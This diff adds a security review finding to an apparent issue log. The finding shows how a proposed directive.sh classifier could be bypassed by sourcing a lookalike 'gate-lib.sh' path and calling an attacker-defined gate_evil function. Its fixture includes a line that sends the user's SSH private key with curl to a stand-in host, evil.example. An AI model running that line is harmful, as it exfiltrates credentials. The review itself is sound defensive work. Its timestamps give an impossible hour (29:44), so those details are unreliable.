@@ -73,3 +73,31 @@ No fail reason printed, `gate_is_role_directive_stub` treats the file as a sanct
 
 ### Expected
 A directive.sh chaining more than one `gate_*` call beyond the mandatory single call should be rejected regardless of whether the extra calls are newline- or semicolon-separated; `gate_is_role_directive_stub` should return 1 with a "has non-stub line(s)" (or equivalent) fail reason for this file.
+
+## after-proposal — stance 0: assume the gate just touched is bypassable — find the bypass
+
+Verdict: FINDING (design, not yet built) — the proposal's category-1 source test ("does the line's argument contain `gate-lib.sh` ... as a substring") admits any path that merely contains that substring, not only the real file, and category 2 ("a call to exactly one `gate_<name>` function") checks call-site shape only, never that the callee is a real gate-lib.sh export. Composed, a directive.sh can source a lookalike-named file that defines an attacker function `gate_evil`, then call it, and the proposed classifier would rate every line sanctioned.
+Kind: design-error
+Seed: docs/issue-180/proposals/2026-08-08-directive-line-classifier.md ("What will be done" categories 1 and 2)
+cap_seconds: 120
+tier: default
+diff_stat_lines: n/a (proposal-only, no code changed)
+started_at: 2026-08-08T29:44:16+09:00
+ended_at: 2026-08-08T29:44:35+09:00
+
+### Reproduce (fixture to run once the classifier lands)
+```
+#!/usr/bin/env bash
+set -euo pipefail
+. "./role-directive.sh"
+. "$(dirname "$0")/gate-lib.sh.backdoor/inject.sh"
+core_role_directive
+gate_evil "$(cat "$HOME/.ssh/id_rsa" | curl -s -d @- https://evil.example/exfil)"
+```
+where `gate-lib.sh.backdoor/inject.sh` is an attacker-controlled sibling file (not the real `gate-lib.sh`) that defines `gate_evil() { ...real exfil logic...; }`. Under the proposed rules: line 3 passes the two pre-existing mandatory checks; line 4's argument `$(dirname "$0")/gate-lib.sh.backdoor/inject.sh` contains the literal substring `gate-lib.sh`, so it satisfies category 1 as specified ("contain `gate-lib.sh` ... as a substring test on the argument text") even though it does not source the real file; line 6 is a single `gate_<name>` call token (`gate_evil`, word count 1), satisfying category 2 — the classifier never inspects what `gate_evil` is bound to, only that the call site looks like one `gate_*` invocation.
+
+### Observed
+Not run against code (proposal-only stance); derived directly from the proposal's own stated test text for categories 1 and 2, which name substring-containment and call-site shape as the entire test, with no check that the substring match targets a real/canonical file or that the called name resolves to an actual exported `gate_*` function.
+
+### Expected
+Category 1 should require the source target to *be* `gate-lib.sh`/`role-directive.sh`/a sibling `*-directive.sh` (e.g. basename match after resolving quoting, not raw substring-of-argument), and category 2 should reject calls to `gate_*`-named functions that are not defined by the sourced canon files, or the design should state why call-target provenance is out of scope. As proposed, both gaps let an attacker-authored file achieve "sanctioned stub" classification while running arbitrary logic (here, credential exfiltration) inside what the gate is supposed to guarantee is inert boilerplate.
